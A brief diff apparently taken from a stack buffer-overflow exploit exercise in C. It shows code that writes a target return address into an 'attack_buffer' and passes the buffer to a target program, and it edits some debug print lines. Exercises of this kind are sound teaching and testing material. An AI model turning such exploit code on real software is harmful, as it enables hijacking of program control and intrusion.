@@ -32,10 +32,10 @@ main ( int argc, char * argv[] )
 	attack_buffer[BUF_TO_RET + 1] = (char) ((target >> 16) & 0xff);
 	attack_buffer[BUF_TO_RET] = (char) ((target >> 24) & 0xff);
 
-	memset(&attack_buffer[120], target, 4);
+	// memset(&attack_buffer[120], target, 4);
 
-	printf("&attack_buffer[120] as hex: %x\n",&attack_buffer[BUF_TO_RET]);
-	printf("%x%x%x%x\n",attack_buffer[BUF_TO_RET], attack_buffer[BUF_TO_RET+1], attack_buffer[BUF_TO_RET+2], attack_buffer[BUF_TO_RET+3]);
+	printf("hex: %x\n",attack_buffer[BUF_TO_RET]);
+	printf("&: %x\n",*(&attack_buffer[BUF_TO_RET]));
 
 	args[0] = TARGET;
 	args[1] = attack_buffer;
